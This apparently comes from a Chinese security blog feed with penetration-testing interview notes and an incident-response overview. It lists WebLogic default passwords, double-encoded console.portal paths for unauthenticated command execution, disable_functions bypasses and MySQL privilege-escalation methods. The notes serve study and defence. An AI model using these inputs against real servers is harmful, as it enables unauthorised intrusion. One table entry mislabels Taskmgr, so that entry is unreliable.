5.1/lib/plugin/xxoo.dll&#39;;</code>这样子可以UDF提权</p><p>3.dumpfile和outfile有什么不一样？<br>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p><p>4.sleep()能不能写shell？<br>SLEEP()函数本身并不能获取shell，但是可以联动其它漏洞获取shell</p><p>5.写shell的条件？</p><ul><li>用户权限</li><li>目录读写权限</li><li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞<br>其中<code>open_basedir</code>: 将用户可操作的文件限制在某目录下</li></ul><p>6.mysql写shell的条件？</p><ul><li>网站可访问路径的绝对路径</li><li>secure_file_priv 的值非NULL或包含了导出的绝对路径</li><li>mysql服务有对网站可访问路径的写权限</li><li>mysql连接用户有FILE权限/ROOT用户或ROOT权限</li><li>GPC关闭//未对闭合用的引号转义<br>secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出<br>Mysql&lt;5.5.53 默认为空，即默认无限制<br>outfile 和 dumpfile的路径不支持hex，必须有引号包裹</li></ul><p>7.mysql日志写shell的条件？<br>与导出函数写Shell相比，规避了 secure_file_priv 的限制</p><ol><li>网站可访问路径的绝对路径</li><li>mysql服务有对网站可访问路径的写权限</li><li>mysql连接用户有权限开启日志记录和更换日志路径/ROOT权限</li><li>GPC关闭/未对闭合用的引号转义<br>虽然日志路径可以hex编码，但被记入日志的查询语句中的shell内容需要引号包裹，加<code>\</code>后传到数据库执行会报错，无法记录进日志</li></ol><p>8.disable_functions 怎么绕过？</p><ol><li>黑名单总有漏网之鱼，多尝试一些函数</li><li>LD_PRELOAD：原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作</li><li>lmageMagick：利用lmageMagick命令执行漏洞（CVE-2016-3714）</li><li>Windows系统组件COM绕过</li><li>PHP7.4 FFI绕过</li><li>利用Bash破壳（CVE-2014-6271）漏洞绕过</li><li>利用imap_open()绕过（CVE-2018-19518）</li><li>利用pcntl插件绕过</li></ol><p>9.Mysql有几种提权方式？<br>【Mysql_UDF 提权】<br>利用了root高权限，创建带有调用 cmd 的函数的 udf.dll 动态链接库<br>导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd<br>限制条件：</p><ol><li>MySQL 数据库没有开启安全模式（确认secure_file_priv=’’是否为空）</li><li>已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</li><li>shell有写入到数据库安装目录的权限。<br>【MOF提权】<br>基本上在Windows Server 2003的环境下才可以成功。<br>原理是C:/Windows/system32/wbem/mof/目录下的mof文件每隔几秒钟左右都会被系统执行，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本来调用CMD来执行系统命令，如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令了。<br>【反弹端口连接提权】<br>需要一个root弱密码，并且可以外连</li></ol><p>10.报错注入的函数有哪些？</p><pre><code>updatexml、extractvalue、floor、exp</code></pre><h5 id="拿到webshell不出网情况下怎么办？"><a href="#拿到webshell不出网情况下怎么办？" class="headerlink" title="拿到webshell不出网情况下怎么办？"></a>拿到webshell不出网情况下怎么办？</h5><p>reg上传去正向连接。或探测出网协议，如dns，icmp</p><h5 id="知不知道脏牛提权漏洞？"><a href="#知不知道脏牛提权漏洞？" class="headerlink" title="知不知道脏牛提权漏洞？"></a>知不知道脏牛提权漏洞？</h5><p>Linux内核 &gt;= 2.6.22的内存子系统在处理写入复制时产生了竞争条件（race condition）。<br>恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。<br>利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限</p><h5 id="sqlmap的–level和–risk的区别？"><a href="#sqlmap的–level和–risk的区别？" class="headerlink" title="sqlmap的–level和–risk的区别？"></a>sqlmap的–level和–risk的区别？</h5><p>level级别越高发送的请求越多，并且在level3以上时会尝试对referer注入。<br>而risk则是风险系数，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的QL注入测试。</p><h5 id="MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="MYSQL 数据库的站，只有一个 80 端口开放？"></a>MYSQL 数据库的站，只有一个 80 端口开放？</h5><p>做了站库分离；更改了端口使3306端口不对外开放。</p><h5 id="3389-无法连接是什么情况？"><a href="#3389-无法连接是什么情况？" class="headerlink" title="3389 无法连接是什么情况？"></a>3389 无法连接是什么情况？</h5><ul><li>没开放 3389 端口</li><li>端口被修改</li><li>防护拦截</li><li>处于内网(需进行端口转发)</li></ul><h5 id="上传图片可以正常访问，上传脚本格式访问则403怎么办？"><a href="#上传图片可以正常访问，上传脚本格式访问则403怎么办？" class="headerlink" title="上传图片可以正常访问，上传脚本格式访问则403怎么办？"></a>上传图片可以正常访问，上传脚本格式访问则403怎么办？</h5><p>有可能Web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。</p><h5 id="token和refer横向对比-谁安全等级高？"><a href="#token和refer横向对比-谁安全等级高？" class="headerlink" title="token和refer横向对比 谁安全等级高？"></a>token和refer横向对比 谁安全等级高？</h5><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS 跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。<br>但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p><h5 id="代码执行、文件读取、命令执行函数有哪些？"><a href="#代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行函数有哪些？"></a>代码执行、文件读取、命令执行函数有哪些？</h5><pre><code>建议熟背一下！1）代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function2）文件读取：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(),fgets(),parse_ini_file(),show_source(),file()等3)命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(),popen(),proc_open()</code></pre><h5 id="为什么aspx木马权限比asp大？"><a href="#为什么aspx木马权限比asp大？" class="headerlink" title="为什么aspx木马权限比asp大？"></a>为什么aspx木马权限比asp大？</h5><p>aspx使用的是.net技术。IIS中默认不支持，ASP只是脚本语言而已。<br>入侵的时候asp的木马一般是guest权限而APSX的木马一般是users权限。</p><h5 id="提权为何选择可读写目录？不用带空格的目录？"><a href="#提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="提权为何选择可读写目录？不用带空格的目录？"></a>提权为何选择可读写目录？不用带空格的目录？</h5><p>因为exp执行多半需要空格界定参数</p><h5 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;拿到目标站以后的渗透思路？&quot;&gt;&lt;a href=&quot;#拿到目标站以后的渗透思路？&quot; class=&quot;headerlink&quot; title=&quot;拿到目标站以后的渗透思路？&quot;&gt;&lt;/a&gt;拿到目标站以后的渗透思路？&lt;/h5&gt;&lt;p&gt;渗透测试流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;项目前期准</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>护网面试总结</title>
    <link href="https://liu1272.github.io/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-07-31T08:40:00.000Z</published>
    <updated>2023-07-31T17:55:42.493Z</updated>
    
    <content type="html"><![CDATA[<h5 id="首先看简历"><a href="#首先看简历" class="headerlink" title="首先看简历"></a>首先看简历</h5><p>简历不要乱吹，会什么就写什么；<br>只要你写在简历上的面试官都会着重问。</p><h5 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h5><p>基本上第一句是先让你做个自我介绍<br>你说的东西后面一定会问下去，所以建议说点项目或者设备的东西，先不要这么快上强度。</p><h5 id="判断恶意外连-分析威胁情报"><a href="#判断恶意外连-分析威胁情报" class="headerlink" title="判断恶意外连/分析威胁情报"></a>判断恶意外连/分析威胁情报</h5><ol><li>首先外连是从内到外</li><li>查看外连使用的协议</li><li>查看ip，看流量，看告警分析，看返回包、状态码</li></ol><h5 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h5><p><strong>Log4j</strong><br>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。<br>该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以<code>:</code>号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</p><p>核心原理为，通过Lookup接口+LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。</p><p>日志在打印时当遇到<code>$&#123;</code>后，Interpolator类以<code>:</code>号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过prefix去找对应的 lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行。</p><p>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</p><p><strong>Shiro</strong><br>shiro提供记住密码功能<br>Payload产生的过程：命令=》序列化=》AES加密=》base64编码=》RememberMe Cookie值<br>利用：用生成的Payload，构造数据包，伪造cookie发送payload<br>【SHIRO-550】<br>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：<br>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化<br>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞<br>【SHIRO-721】<br>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的<br>RememberMe cookie即可完成攻击<br>【两者区别】<br>shiro550使用可以使用已知密钥碰撞，但是shiro721由系统随机生成<br>550先验证”rememberMe” Cookie的值，再进行身份验证，因此可以绕过身份认证达成未授权访问<br>721登录时先进行身份验证，再验证”rememberMe” Cookie的值，所以需要一个可用的会话来利用<br>最后：shiro登录流程可以自定义</p><p><strong>weblogic</strong><br>weblogic就是把java应用程序运行起来，并提供服务的一种程序。</p><ol><li>weblogic控制台的7001端口，默认会开启T3协议服务，T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</li><li>weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</li></ol><p><strong>fastjson</strong><br>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断<br>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数<br>【无回显怎么办】</p><ol><li>一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</li><li>通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</li><li>直接将命令执行结果回显到请求Poc的HTTP响应中</li></ol><p><strong>Jboss</strong><br>Jboss是一个管理EJB的容器和服务器。<br>下面是三个JBoss反序列化漏洞：<br>漏洞存在/jbossmq-httpil/HTTPServerILServlet中<br>漏洞存在/invoker/readonly中<br>漏洞存在/invoker/JMXInvokerServlet中<br>程序获取http请求数据保存到httpRequest中，进一步处理后保存到变量ois中，然后程序没有对该数据进行过滤，直接使用readObject()方法进行反序列化。</p><p><strong>Python</strong><br>Python内置了很多序列化/反序列化的方式，最常用的有json、pickle、marshal这三种。<br>json较为安全，因为它序列化后的字符串长度最小。<br>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。<strong>reduce</strong>()类似与PHP中的wakeup，在反序列化的时候会自动调用。<br>防御：<br>1、用更高级的接口__getnewargs()、getstate()、setstate()等代替reduce()魔术方法；<br>2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</p><p><strong>PHP</strong><br>以前的文章已经做出说明，不再重复叙述。</p><h5 id="有哪些常见的框架-中间件漏洞"><a href="#有哪些常见的框架-中间件漏洞" class="headerlink" title="有哪些常见的框架/中间件漏洞"></a>有哪些常见的框架/中间件漏洞</h5><p><strong>Python_Django</strong><br>目录遍历漏洞、重置密码漏洞、SQL注入漏洞、任意代码执行</p><p><strong>Python_Flask</strong><br>SSTI模板注入漏洞（后面再学习）</p><p><strong>Python_Web2py</strong><br>本地文件包含漏洞、输入验证漏洞</p><p><strong>Python_Tornado</strong><br>Tornado是非阻塞式服务器，而且速度相当快<br>文件读取漏洞：os.path.abspath函数获得的路径，是没有结尾处的”/“的，因此可以自己构造路径<br>模板注入漏洞：同样后面再学习</p><p><strong>Python_Scrapy</strong><br>scrapyd未授权访问漏洞:6800端口可以部署恶意的scrapy包到云服务，进而获取服务器权限<br>Scrapy反序例化漏洞</p><p><strong>struts2</strong><br>struts是java的web框架<br>在注册或登录页面，提交失败后一般会默认返回之前提交的数据<br>由于后端使用<code>%&#123;value&#125;</code>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。<br>……</p><p><strong>weblogic</strong><br>weblogic是java的web框架<br>弱口令漏洞：</p><pre><code>用户名：weblogic、system、admin、WebLogic密码：weblogic、weblogic123、password、security、system、admin、WebLogic然后在上传处上传一个jsp类型的小马的war包来拿到shell</code></pre><p>任意文件读取漏洞：</p><pre><code>http://ip:7001/hello/file.jsp?path=  #接文件路径Weblogic 后台的密文与密钥这两个文件分别为 config.xml 和 SerializedSystemIni.dat</code></pre><p>未授权远程命令执行漏洞：</p><pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal或http://ip:7001/console/images/%252e%252e%252fconsole.portal或者构造一个反弹shell XML 文件，通过访问这个文件来执行命令</code></pre><h5 id="远程代码执行漏洞分类"><a href="#远程代码执行漏洞分类" class="headerlink" title="远程代码执行漏洞分类"></a>远程代码执行漏洞分类</h5><ol><li>直接调用系统函数例如exec</li><li>把序列化的包反序列化的时候调用不当出现了rce</li></ol><h5 id="常见反序列化的流量特征"><a href="#常见反序列化的流量特征" class="headerlink" title="常见反序列化的流量特征"></a>常见反序列化的流量特征</h5><p>shiro就看cookie中rememberMe字段，什么都要从这里传<br>fastjson：可以在提交的包中找找json格式的数据，重点看一下有无rmi或者出网的一些行为，（在十六进制中会呈现ACED开头，这段不确定）<br>st2-045：请求头中的Content-Type字段</p><h5 id="问漏洞题不会回答怎么办"><a href="#问漏洞题不会回答怎么办" class="headerlink" title="问漏洞题不会回答怎么办"></a>问漏洞题不会回答怎么办</h5><ol><li>先讲漏洞原理</li><li>漏洞特征，流量，返回码</li><li>结合设备特性讲</li></ol><h5 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h5><p><strong>报错注入</strong></p><pre><code>updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数extractvalue()      是mysql对xml文档数据进行查询的xpath函数floor()             mysql中用来取整的函数exp()               此函数返回e(自然对数的底)指数X的幂值</code></pre><p><strong>时间盲注</strong></p><pre><code>sleep()             直接延迟时间benchmark()         通过计算md5消耗时间</code></pre><p><strong>堆叠植入</strong></p><pre><code>mysqli_multi_query()    可以使用;堆叠多条语句</code></pre><p><strong>宽字节注入</strong></p><pre><code>使用PHP连接Mysql的时候，当设置&quot;character_set_client=gbk&quot;时会导致一个编码转换的问题mysql在使用GBK编码的时候，会认为两个字符是一个汉字GBK就是常说的宽字节之一，实际上只有两个字节前一个ASCII码要大于128,才到汉字的范围</code></pre><p><strong>防护方案</strong></p><ol><li>预编译</li><li>限制长度</li><li>加WAF</li><li>通信加密<br>其中预编译：<br>因为sql注入是因为动态字符串的拼接导致sql命令发生改变，然后编译并且执行错误的结果。<br>而sql预处理则是提前“告诉”sql语法处理器，提前声明并且编译特定格式的sql语句，然后将所有用户的输入视为纯字符串参数，最后组成查询语句。</li></ol><p><strong>sql注入的进一步利用</strong></p><ol><li>拖库</li><li>在有绝对路径和into outfile函数时写shell到web目录下</li><li>服务器超管，获取服务器管理员权限</li><li>mssql2005之前在SQLsever利用xp_cmdshell提权</li><li>UDF提权是用户自定义函数，写一个恶意的dll到系统system32目录下（定义一个可以执行系统命令的函数）</li></ol><h5 id="常见的解析漏洞有哪些"><a href="#常见的解析漏洞有哪些" class="headerlink" title="常见的解析漏洞有哪些"></a>常见的解析漏洞有哪些</h5><ul><li>IIS 6.0   /xx.asp/xx.jpg “xx.asp”是文件夹名</li><li>IIS 7.0   /7.5默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</li><li>Nginx 版本小于等于 0.8.37，利用方法和IIS7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg.php</li><li>Apache上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</li><li>lighttpd xx.jpg/xx.php，</li></ul><h5 id="ISS服务器要做哪些方面保护措施"><a href="#ISS服务器要做哪些方面保护措施" class="headerlink" title="ISS服务器要做哪些方面保护措施"></a>ISS服务器要做哪些方面保护措施</h5><ol><li>保持 Windows 升级:</li><li>使用 IIS 防范工具</li><li>移除缺省的 Web 站点</li><li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li><li>有规则地检查你的管理员组和服务:</li><li>严格控制服务器的写访问权限</li><li>设置复杂的密码</li><li>减少/排除 Web 服务器上的共享</li><li>禁用 TCP/IP 协议中的 NetBIOS:</li><li>使用 TCP 端口阻塞</li><li>仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat</li><li>管理 IIS 目录安全:</li><li>使用 NTFS 安全:</li><li>管理用户账户</li><li>审计你的 Web 服务器</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;首先看简历&quot;&gt;&lt;a href=&quot;#首先看简历&quot; class=&quot;headerlink&quot; title=&quot;首先看简历&quot;&gt;&lt;/a&gt;首先看简历&lt;/h5&gt;&lt;p&gt;简历不要乱吹，会什么就写什么；&lt;br&gt;只要你写在简历上的面试官都会着重问。&lt;/p&gt;
&lt;h5 id=&quot;第一个问题&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>应急响应概述</title>
    <link href="https://liu1272.github.io/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/</id>
    <published>2023-07-14T13:24:00.000Z</published>
    <updated>2023-08-06T12:35:11.745Z</updated>
    
    <content type="html"><![CDATA[<h3 id="应急响应概述"><a href="#应急响应概述" class="headerlink" title="应急响应概述"></a>应急响应概述</h3><h4 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h4><p>事件判断:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。<br>临时处置:给出客户临时处置建议，断网隔离，保护现场环境。<br>信息收集分析:收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析、样本分析。<br>清理处置:直接杀掉进程，删除文件，打补丁，抑或是修复文件。<br>产出报告:整理并输出完整的安全事件报告。</p><h4 id="常受攻击Web漏洞"><a href="#常受攻击Web漏洞" class="headerlink" title="常受攻击Web漏洞"></a>常受攻击Web漏洞</h4><table><thead><tr><th>攻击平台</th><th>漏洞编号</th></tr></thead><tbody><tr><td>Weblogic</td><td>CVE-2017-3248/CVE-2017-10271/CVE-2018-2628/CVE-2018-2894</td></tr><tr><td>Drupal</td><td>CVE-2018-7600/CVE-2018-7602</td></tr><tr><td>Struts2</td><td>CVE-2017-5638/CVE-2017-9805/CVE-2018-11776</td></tr><tr><td>ThinkPHP</td><td>ThinkPHPv5 GetShell</td></tr><tr><td>Windows Server</td><td>弱口令爆破/CVE-2017-0143</td></tr><tr><td>PHPStudy</td><td>弱口令爆破</td></tr><tr><td>PHPMyAdmin</td><td>弱口令爆破</td></tr><tr><td>MySQL</td><td>弱口令爆破</td></tr><tr><td>Tomcat</td><td>弱口令爆破/CVE-2017-12615</td></tr><tr><td>Spring Data Commons</td><td>CVE-2018-1273</td></tr><tr><td>Jekins</td><td>CVE-2019-1003000</td></tr><tr><td>JBoss</td><td>CVE-2010-0738/CVE-2017-12149</td></tr></tbody></table><h4 id="常受攻击组件漏洞"><a href="#常受攻击组件漏洞" class="headerlink" title="常受攻击组件漏洞"></a>常受攻击组件漏洞</h4><table><thead><tr><th>应用</th><th>漏洞名</th></tr></thead><tbody><tr><td>Docker</td><td>Docker未授权漏洞</td></tr><tr><td>Nexus Repository</td><td>Nexus Repository Manager 3远程代码执行漏洞</td></tr><tr><td>ElasticSearch</td><td>ElasticSearch未授权漏洞</td></tr><tr><td>Hadoop Yarn</td><td>Hadoop Yarn REST API未授权漏洞</td></tr><tr><td>Kubernetes</td><td>Kubernetes Api Server 未授权漏洞</td></tr><tr><td>Jenkins</td><td>Jenkins RCE(CVE-2019-1003000)</td></tr><tr><td>Spark</td><td>Spark REST API未授权漏洞</td></tr></tbody></table><h4 id="处置思路"><a href="#处置思路" class="headerlink" title="处置思路"></a>处置思路</h4><ol><li>找到webshell</li><li>确定攻击者IP（合理猜测）</li><li>回溯攻击者操作</li><li>梳理整个攻击过程（据实分析，积极沟通）</li></ol><h4 id="应急前沟通"><a href="#应急前沟通" class="headerlink" title="应急前沟通"></a>应急前沟通</h4><ul><li>现场现象是什么?如何发现的?(依据是什么) ?</li><li>什么时候发现的?</li><li>目前是否有做物理隔离(断网) ?</li><li>受害机器是哪个?</li><li>受害服务有几台?(1台/N台)</li><li>最先发现是哪台 ?</li><li>这台服务器对外有哪些服务?</li><li>这台服务器于其他机器是否处于同一个内网?</li><li>操作系统类型? </li><li>是否有公网映射业务? </li><li>远程管理方式? </li><li>网络边界有没有流量监控设备? </li><li>主机侧是否有EDR等安全设备</li></ul><h4 id="响应事件——Web攻击"><a href="#响应事件——Web攻击" class="headerlink" title="响应事件——Web攻击"></a>响应事件——Web攻击</h4><p><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容、拖库、内网沦陷等排查<br><strong>要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 备份文件;webshell后门查杀;web日志分析;web中间件缓存处理;web中间件配置检查;重启web中间件;服务器后门检查;<br><strong>防护措施:</strong> 加固相关web应用，修改相关系统的所有用户密码</p><h4 id="响应事件——链路劫持"><a href="#响应事件——链路劫持" class="headerlink" title="响应事件——链路劫持"></a>响应事件——链路劫持</h4><p><strong>相关表现:</strong> 区域性服务不可用或返回异常内容<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容等<br><strong>排查要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围:在能复现的环境中判断是DNS劫持还是HTTP劫持<br><strong>防护措施:</strong> 重要业务部署https</p><h4 id="响应事件——代理隧道"><a href="#响应事件——代理隧道" class="headerlink" title="响应事件——代理隧道"></a>响应事件——代理隧道</h4><p><strong>相关表现:</strong> 持续性或间断性外连行为，通常为tcp协议，对内网多个主机有访问行为<br><strong>相关危害:</strong> 作为跳板机攻击其他内网资产<br><strong>排查要点:</strong> 确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型<br><strong>防护措施:</strong> 完善内网acl，服务器按业务需要通过白名单策略访问外网</p><h4 id="响应事件——替换系统命令"><a href="#响应事件——替换系统命令" class="headerlink" title="响应事件——替换系统命令"></a>响应事件——替换系统命令</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面<br><strong>操作要点:</strong> 使用静态链接的busybox;重新安装被替换的包<br><strong>命令:</strong> </p><pre><code>rpm -Vadpkg --verify</code></pre><h4 id="响应事件——ld-so-preload动态链接库劫持"><a href="#响应事件——ld-so-preload动态链接库劫持" class="headerlink" title="响应事件——ld.so.preload动态链接库劫持"></a>响应事件——ld.so.preload动态链接库劫持</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 检查/etc/ld.so.preload，ld.so(如/lib/x86_64-linux-gnu/ld-2.27.so)<br><strong>操作要点:</strong> 使用静态链接的busybox; 重启被注入恶意模块的进程，必要时直接重启系统</p><h4 id="响应事件——内核态rootkit"><a href="#响应事件——内核态rootkit" class="headerlink" title="响应事件——内核态rootkit"></a>响应事件——内核态rootkit</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:隐藏文件、进程等信息<br><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程;<br><strong>操作要点:</strong> 使用tyton内核态rootkit检测工具检测:检查/etc/modules是否有未知的内核模块</p><h4 id="响应事件——计划任务"><a href="#响应事件——计划任务" class="headerlink" title="响应事件——计划任务"></a>响应事件——计划任务</h4><p><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS请求、篡改页面等行为<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:周期性篡改页面、拉取数据等<br><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查/var/spool/cron/crontabs/，/etc/cron.*等常用计划任务配置文件<br><strong>操作要点:</strong> 停止计划任务服务后再操作;注意辨别利用\r回车符的障眼法小技巧</p><h4 id="响应事件——远控木马"><a href="#响应事件——远控木马" class="headerlink" title="响应事件——远控木马"></a>响应事件——远控木马</h4><p><strong>相关表现:</strong> 有持续或间断性的对外网络链接或DNS请求等通信行为<br><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器<br><strong>排查要点:</strong> 关注tcp、udp、icmp等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点<br><strong>操作要点:</strong> 检查网络连接，以及IDS设备上的异常远控告警</p><h3 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><table><thead><tr><th>常用命令</th><th>说明</th></tr></thead><tbody><tr><td>regedit</td><td>注册表</td></tr><tr><td>Taskmgr</td><td>注册表</td></tr><tr><td>Msconfig</td><td>系统配置(包含启动项)</td></tr><tr><td>eventvwr.msc</td><td>事件查看器</td></tr><tr><td>compmgmt.msc</td><td>计算机管理(本地用户和组)</td></tr><tr><td>gpedit.msc</td><td>本地组策略</td></tr><tr><td>taskschd.msc</td><td>计划任务</td></tr><tr><td>lusrmgr.msc</td><td>本地用户和组</td></tr></tbody></table><pre><code>获取本机用户列表: net user本机管理员: net localgroup administrators查看当前会话: net session查看当前运行的服务: net start远程连接: net use查看当前用户下的共享目录: net share最近打开的文件:%UserProfile%\Recent          %APPDATA%\Microsoft\Windows\Recent          查找文件中的字符串: findstr /m /i /s &quot;hello&quot; *.txt查看网络连接: netstat - ano操作系统的详细配置信息: systeminfo获取系统进程信息: Wmic process根据应用程序查找PID: wmic process where name=&quot;cmd.exe”get processid,executablepath,name根据PID查找应用程序: wmic process where processid=&quot;4296”get executablepath,name获取系统进程信息:tasklist对于要查询特定dll的调用情况，可以使用命令tasklist /m dll名称计算样本MD5: certutil -hashfile %样本文件名% MD5</code></pre><h4 id="应急管理工具"><a href="#应急管理工具" class="headerlink" title="应急管理工具"></a>应急管理工具</h4><p><strong>PChunter</strong><br>系统信息监控工具，主要拿来看数字签名<br>黑色是微软认证的<br>粉红色是未认证的<br>红色是可疑进程</p><p><strong>Autoruns</strong><br>启动项、计划任务等动态监测工具</p><p><strong>Process Explorer</strong><br>应用程序监测工具<br>数据量很大，需要过滤</p><p><strong>TCPView</strong><br>其实就是<code>netstat -ano</code>的输出，但是可视化方便处理</p><p><strong>Microsoft Network Monitor</strong><br>很小的一个流量监控软件<br>安装完需要重启，可以监测单个程序进程</p><p><strong>D盾</strong><br>查杀webshell</p><p><strong>Everything</strong><br>快速查找文件和目录</p><p><strong>sysmon</strong><br>微软开发的系统监控工具，常用来判断挖矿后门等等</p><table><thead><tr><th>ID</th><th>说明</th></tr></thead><tbody><tr><td>Event ID 1</td><td>进程创建事件，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等</td></tr><tr><td>Event ID 3</td><td>网络连接事件，当恶意程序外连 CC 